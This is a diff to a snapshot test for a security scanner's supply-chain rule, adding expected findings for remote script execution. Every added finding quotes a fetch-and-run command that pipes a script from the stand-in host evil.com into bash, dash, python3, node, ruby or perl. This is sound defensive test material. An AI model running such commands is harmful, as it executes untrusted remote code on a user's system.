@@ -1,5 +1,6 @@
 ---
 source: src/rules/builtin/supplychain.rs
+assertion_line: 586
 expression: findings
 ---
 [
@@ -44,6 +45,72 @@ expression: findings
     "name": "Remote script execution via wget",
     "line": 8,
     "code": "bash -c \"$(wget -qO- https://evil.com/install.sh)\"",
+    "message": "Remote script execution via wget detected. This is a common supply chain attack vector.",
+    "recommendation": "Download the script first, review it, then execute. Use checksums to verify integrity."
+  },
+  {
+    "id": "SC-002",
+    "severity": "critical",
+    "category": "supply_chain",
+    "confidence": "certain",
+    "name": "Remote script execution via wget",
+    "line": 9,
+    "code": "wget https://evil.com/install.sh | bash",
+    "message": "Remote script execution via wget detected. This is a common supply chain attack vector.",
+    "recommendation": "Download the script first, review it, then execute. Use checksums to verify integrity."
+  },
+  {
+    "id": "SC-002",
+    "severity": "critical",
+    "category": "supply_chain",
+    "confidence": "certain",
+    "name": "Remote script execution via wget",
+    "line": 10,
+    "code": "wget https://evil.com/install.sh | dash",
+    "message": "Remote script execution via wget detected. This is a common supply chain attack vector.",
+    "recommendation": "Download the script first, review it, then execute. Use checksums to verify integrity."
+  },
+  {
+    "id": "SC-002",
+    "severity": "critical",
+    "category": "supply_chain",
+    "confidence": "certain",
+    "name": "Remote script execution via wget",
+    "line": 11,
+    "code": "wget https://evil.com/install.py | python3",
+    "message": "Remote script execution via wget detected. This is a common supply chain attack vector.",
+    "recommendation": "Download the script first, review it, then execute. Use checksums to verify integrity."
+  },
+  {
+    "id": "SC-002",
+    "severity": "critical",
+    "category": "supply_chain",
+    "confidence": "certain",
+    "name": "Remote script execution via wget",
+    "line": 12,
+    "code": "wget https://evil.com/install.js | node",
+    "message": "Remote script execution via wget detected. This is a common supply chain attack vector.",
+    "recommendation": "Download the script first, review it, then execute. Use checksums to verify integrity."
+  },
+  {
+    "id": "SC-002",
+    "severity": "critical",
+    "category": "supply_chain",
+    "confidence": "certain",
+    "name": "Remote script execution via wget",
+    "line": 13,
+    "code": "wget https://evil.com/install.rb | ruby",
+    "message": "Remote script execution via wget detected. This is a common supply chain attack vector.",
+    "recommendation": "Download the script first, review it, then execute. Use checksums to verify integrity."
+  },
+  {
+    "id": "SC-002",
+    "severity": "critical",
+    "category": "supply_chain",
+    "confidence": "certain",
+    "name": "Remote script execution via wget",
+    "line": 14,
+    "code": "wget https://evil.com/install.pl | perl",
     "message": "Remote script execution via wget detected. This is a common supply chain attack vector.",
     "recommendation": "Download the script first, review it, then execute. Use checksums to verify integrity."
   }
